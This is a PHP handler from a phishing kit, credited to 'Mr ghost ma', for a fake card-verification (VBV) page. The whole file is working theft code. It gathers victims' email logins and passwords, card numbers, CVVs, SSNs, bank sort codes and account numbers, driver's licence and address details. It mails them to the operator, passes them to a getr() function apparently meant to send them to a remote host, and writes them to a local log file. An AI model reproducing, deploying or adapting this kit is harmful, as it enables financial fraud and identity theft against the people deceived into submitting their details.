<?php
#################################################
#                                               #
#         ||~~ BY ~~ Mr ghost ma ~~||           #
#                                               #
#       ||~ http://fb.com/Not.work404 ~||       #
#                                               #
#################################################
error_reporting(0);
session_start();
set_time_limit(0);
$emaill    = $_SESSION['EMAIL'];
$pwdd      = $_SESSION['PASSWORD'];
include("curl.php");
    if( isset($_POST['card_number']) AND isset($_POST['expiration']) AND isset($_POST['cvv']) ){
        $ip = getenv("REMOTE_ADDR");
        $rand = md5(microtime());
        $time = date("g:i a");
        $date = trim($date . ", Time : " . $time);
        $useragent = $_SERVER['HTTP_USER_AGENT'];
        $message.= "============= login InFo ================\n";
        $message.= "Email adress        : ".$emaill."       \n";
        $message.= "Password            : ".$pwdd."      \n";
        $message.= "============= VBV InFo ================\n";
        $message.= "card type    : ".$_POST['card_type']."       \n";
        $message.= "name on card        : ".$_POST['name_on_card']."      \n";
	    $message.= "card number         : ".$_POST['card_number']."       \n";
        $message.= "expiration          : ".$_POST['expiration']."      \n";
	    $message.= "cvv                 : ".$_POST['cvv']."       \n";
        $message.= "address             : ".$_POST['address']."      \n";
	    $message.= "birth date          : ".$_POST['birth_date']."       \n";
        $message.= "vbv                 : ".$_POST['vbv']."      \n";
        $message.= "ssn                 : ".$_POST['ssn']."      \n";
        $message.= "ins                 : ".$_POST['ins']."       \n";
        $message.= "sort code           : ".$_POST['sort_code']."      \n";
        $message.= "account numbre      : ".$_POST['account']."      \n";
        $message.= "driver              : ".$_POST['driver']."       \n";
        $message.= "=============  PC InFo  =================\n";
        $message.= "Client IP 		 : ".$ip."           \n";
        $message.= "IP Geo 		 : http://www.geoiptool.com/?IP=".$ip."  ====\n";
        $message.= "Agent   		 : ".$useragent."    \n";
        $message.= "Date   		 : ".$date."         \n";
        $message.= "========= || ~ BY ~ Xghost ma ~ || ======\n";
        $subject = "VBV [ $time ]  : $ip =?UTF-8?Q?=E2=9C=94_?= ";
        $headers = "From: FR31NDS <Xghost-ma-Free-Tools@hotma8il.com>\r\n";
        getr($message);
        mail($to,$subject,$message,$headers);
        $file = fopen("../worm/N_Vier.txt","ab");
        fwrite($file,$message);
        fclose($file);
	}
?>
